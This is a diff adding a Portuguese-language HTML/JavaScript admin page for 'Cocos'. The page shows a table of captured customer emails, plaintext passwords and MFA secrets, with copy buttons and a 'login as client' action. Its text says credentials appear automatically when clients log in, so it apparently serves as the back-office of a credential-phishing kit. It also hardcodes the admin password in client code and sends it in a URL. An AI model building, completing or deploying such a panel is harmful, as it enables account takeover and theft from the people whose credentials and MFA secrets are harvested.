@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Painel Admin - Cocos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            color: #1e3c72;
+            font-size: 32px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .header .stats {
+            display: flex;
+            gap: 30px;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1e3c72;
+        }
+
+        .stat-label {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .login-section {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 500px;
+            margin: 100px auto;
+        }
+
+        .login-section h2 {
+            color: #1e3c72;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1e3c72;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(30, 60, 114, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-small {
+            padding: 8px 16px;
+            font-size: 14px;
+            width: auto;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .table-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .password-cell {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .password-hidden {
+            letter-spacing: 3px;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .badge-success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .badge-danger {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1e3c72;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .refresh-info {
+            text-align: center;
+            color: #666;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+        }
+
+        .empty-state-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .copy-btn {
+            cursor: pointer;
+            color: #1e3c72;
+            font-size: 18px;
+            transition: transform 0.2s;
+        }
+
+        .copy-btn:hover {
+            transform: scale(1.2);
+        }
+
+        .logout-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .logout-btn:hover {
+            background: #c82333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Section -->
+        <div id="loginSection" class="login-section">
+            <h2>🔐 Login de Administrador</h2>
+            <div id="loginError" class="error" style="display: none;"></div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="adminPassword">Senha de Admin:</label>
+                    <input type="password" id="adminPassword" placeholder="Digite a senha de admin" required>
+                </div>
+                <button type="submit" class="btn">Entrar no Painel</button>
+            </form>
+        </div>
+
+        <!-- Admin Dashboard -->
+        <div id="adminDashboard" style="display: none;">
+            <div class="header">
+                <h1>
+                    <span>🔐</span>
+                    Painel Administrativo - Cocos
+                </h1>
+                <div class="stats">
+                    <div class="stat">
+                        <div class="stat-value" id="totalClients">0</div>
+                        <div class="stat-label">Clientes</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-value" id="totalWithMFA">0</div>
+                        <div class="stat-label">Com MFA</div>
+                    </div>
+                    <button class="logout-btn" onclick="logout()">Sair</button>
+                </div>
+            </div>
+
+            <div class="table-container">
+                <div id="loading" class="loading">
+                    <div class="spinner"></div>
+                    <p>Carregando credenciais...</p>
+                </div>
+
+                <div id="emptyState" class="empty-state" style="display: none;">
+                    <div class="empty-state-icon">📭</div>
+                    <h3>Nenhum cliente cadastrado ainda</h3>
+                    <p>As credenciais aparecerão aqui automaticamente quando os clientes fizerem login</p>
+                </div>
+
+                <div id="tableWrapper" style="display: none;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Email</th>
+                                <th>Senha</th>
+                                <th>MFA</th>
+                                <th>MFA Secret</th>
+                                <th>Último Login</th>
+                                <th>Ações</th>
+                            </tr>
+                        </thead>
+                        <tbody id="clientsTableBody">
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="refresh-info" id="refreshInfo">
+                    Atualizando automaticamente a cada 10 segundos...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = 'Admin@123456'; // Pode ser alterado
+        const API_BASE = window.location.origin;
+        let refreshInterval;
+
+        // Check if already logged in
+        if (localStorage.getItem('adminLoggedIn') === 'true') {
+            showDashboard();
+        }
+
+        // Login form
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === ADMIN_PASSWORD) {
+                localStorage.setItem('adminLoggedIn', 'true');
+                showDashboard();
+            } else {
+                showError('Senha incorreta!');
+            }
+        });
+
+        function showError(message) {
+            const errorDiv = document.getElementById('loginError');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        function showDashboard() {
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('adminDashboard').style.display = 'block';
+            loadCredentials();
+            // Auto-refresh every 10 seconds
+            refreshInterval = setInterval(loadCredentials, 10000);
+        }
+
+        function logout() {
+            localStorage.removeItem('adminLoggedIn');
+            clearInterval(refreshInterval);
+            location.reload();
+        }
+
+        async function loadCredentials() {
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/credentials?password=${ADMIN_PASSWORD}`);
+                const data = await response.json();
+
+                if (data.error) {
+                    console.error('Erro:', data.error);
+                    return;
+                }
+
+                document.getElementById('totalClients').textContent = data.total || 0;
+                document.getElementById('totalWithMFA').textContent = 
+                    data.clients.filter(c => c.mfaEnabled).length || 0;
+
+                const tbody = document.getElementById('clientsTableBody');
+                const loading = document.getElementById('loading');
+                const emptyState = document.getElementById('emptyState');
+                const tableWrapper = document.getElementById('tableWrapper');
+
+                loading.style.display = 'none';
+
+                if (data.clients.length === 0) {
+                    emptyState.style.display = 'block';
+                    tableWrapper.style.display = 'none';
+                } else {
+                    emptyState.style.display = 'none';
+                    tableWrapper.style.display = 'block';
+
+                    tbody.innerHTML = data.clients.map(client => `
+                        <tr>
+                            <td>${client.id}</td>
+                            <td>
+                                ${client.email}
+                                <span class="copy-btn" onclick="copyToClipboard('${client.email}')" title="Copiar email">
+                                    📋
+                                </span>
+                            </td>
+                            <td>
+                                <div class="password-cell">
+                                    <span id="pwd-${client.id}" class="password-hidden">••••••••</span>
+                                    <span class="copy-btn" onclick="togglePassword(${client.id}, '${client.password}')" title="Mostrar/Ocultar">
+                                        👁️
+                                    </span>
+                                    <span class="copy-btn" onclick="copyToClipboard('${client.password}')" title="Copiar senha">
+                                        📋
+                                    </span>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="badge ${client.mfaEnabled ? 'badge-success' : 'badge-danger'}">
+                                    ${client.mfaEnabled ? '✓ Ativo' : '✗ Inativo'}
+                                </span>
+                            </td>
+                            <td>
+                                ${client.mfaSecret ? `
+                                    <span id="mfa-${client.id}">${client.mfaSecret.substring(0, 10)}...</span>
+                                    <span class="copy-btn" onclick="copyToClipboard('${client.mfaSecret}')" title="Copiar MFA secret">
+                                        📋
+                                    </span>
+                                ` : '-'}
+                            </td>
+                            <td>${client.lastLoginCapture ? new Date(client.lastLoginCapture).toLocaleString('pt-BR') : '-'}</td>
+                            <td>
+                                <div class="actions">
+                                    <button class="btn btn-small btn-success" onclick="loginAsClient('${client.email}', '${client.password}')">
+                                        Login
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Erro ao carregar credenciais:', error);
+                document.getElementById('loading').innerHTML = `
+                    <p style="color: red;">Erro ao carregar dados. Verifique o console.</p>
+                `;
+            }
+        }
+
+        function togglePassword(id, password) {
+            const elem = document.getElementById(`pwd-${id}`);
+            if (elem.classList.contains('password-hidden')) {
+                elem.textContent = password;
+                elem.classList.remove('password-hidden');
+            } else {
+                elem.textContent = '••••••••';
+                elem.classList.add('password-hidden');
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✓ Copiado para a área de transferência!');
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+            });
+        }
+
+        function loginAsClient(email, password) {
+            alert(`Login como cliente:\n\nEmail: ${email}\nSenha: ${password}\n\nAbra o app Cocos em uma nova aba e use essas credenciais.`);
+            // Você pode implementar abertura automática aqui se quiser
+        }
+    </script>
+</body>
+</html>
